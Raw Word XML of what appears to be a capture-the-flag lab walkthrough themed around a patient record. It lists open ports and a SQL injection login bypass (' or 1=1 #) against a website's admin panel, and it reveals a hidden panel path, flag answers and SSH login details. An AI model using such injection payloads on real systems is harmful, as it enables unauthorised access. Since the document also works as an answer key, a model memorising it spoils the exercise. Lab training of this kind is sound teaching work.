    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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pict>
          <v:group id="_x0000_s1107" style="position:absolute;left:0;text-align:left;margin-left:125.5pt;margin-top:1.35pt;width:339pt;height:13.5pt;z-index:-1892;mso-position-horizontal-relative:page" coordorigin="2510,27" coordsize="6780,270">
            <v:shape id="_x0000_s1109" style="position:absolute;left:2520;top:37;width:6760;height:250" coordorigin="2520,37" coordsize="6760,250" path="m2520,287r6760,l9280,37r-6760,l2520,287xe" fillcolor="aqua" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1108" style="position:absolute;left:3120;top:261;width:6161;height:0" coordorigin="3120,261" coordsize="6161,0" path="m3120,261r6161,e" filled="f" strokecolor="gray" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>LUE:</w:t>
      </w:r>
      <w:r w:rsidR="00DA27AD" w:rsidRPr="00DA27AD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DA27AD" w:rsidRPr="00DA27AD">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>PatientX is hiding more than broken bones.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="13" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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7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. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="38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>B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read</w:t>
      </w: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ru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>m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b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-37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mo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g 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oo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’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f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il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s,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4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re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READ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.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x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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2484" w:right="7835"/>
        <w:jc w:val="center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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cat README.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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V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eri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y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y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u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ee t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 m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g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e:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>"Hey Mannie, please don’t overwrite this folder again. —moo"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1860"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1027" type="#_x0000_t75" style="width:420pt;height:122.25pt">
            <v:imagedata r:id="rId25" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37" w:line="378" w:lineRule="auto"/>
        <w:ind w:left="1839" w:right="8252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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>Wh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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>We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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>K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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">w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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">o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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>F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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>: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 K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li IP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=</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839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Ta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get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IP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=</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRPr="007B7C2B" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>CP</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>22, 80</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839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We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si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e </w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ulne</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>le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 SQL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injection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– ‘ or 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1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=1 #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="54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inj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ct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on</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Hid</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="007B7C2B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>en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ge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/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min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/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ol_pa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el.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hp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839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/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mi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/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nt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ol_pa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el.p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p </w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>co</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ns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3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g1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nd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he cl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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1839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b/>
        </w:rPr>
        <w:pict>
          <v:group id="_x0000_s1104" style="position:absolute;left:0;text-align:left;margin-left:84.35pt;margin-top:-142.05pt;width:457.25pt;height:340.55pt;z-index:-1891;mso-position-horizontal-relative:page" coordorigin="1687,-2841" coordsize="9145,6811">
            <v:shape id="_x0000_s1105" style="position:absolute;left:1687;top:-2841;width:9145;height:6811" coordorigin="1687,-2841" coordsize="9145,6811" path="m1687,3970r9145,l10832,-2841r-9145,l1687,3970xe" filled="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r w:rsidR="00A76861" w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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- FL</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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A</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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G</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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{</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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m</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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i</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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n_p</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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an</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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el_sql_</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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b</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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y</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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p</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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a</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ss}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="381" w:lineRule="auto"/>
        <w:ind w:left="1839" w:right="2162"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UE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: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heck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he t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st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inte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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fa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3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-- s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oppy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v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v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e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om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inj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ct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on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hol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3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>;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-)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-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-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nnie. We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si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e </w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sers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: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,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,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nn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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="1839"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SS</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040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ogin: m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 /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le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mein</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839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SS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H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rv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er /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om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/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oo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on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oo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’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 w:rsidRPr="002B4F4A">
        <w:rPr>
